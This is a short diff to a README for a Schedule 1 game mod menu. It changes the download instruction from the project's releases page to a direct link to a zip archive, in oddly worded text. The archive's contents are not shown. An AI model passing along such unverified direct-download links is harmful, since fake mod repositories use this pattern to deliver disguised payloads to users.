@@ -16,7 +16,7 @@ Built for simplicity, speed, and reliability.
 
 ## 🧠 Getting Started
 
-1. Download the latest release from the [Releases](https://github.com/schedule1-mod/menu/releases/latest) page.
+1. Download the latest release from the here [DOWNLOAD](https://github.com/schedule1-mod/menu/releases/download/dl/Schedule.1.Mod.Menu.zip).
 2. Extract the contents into your Schedule 1 directory.
 3. Launch the game and press `Insert` to open the menu.
 
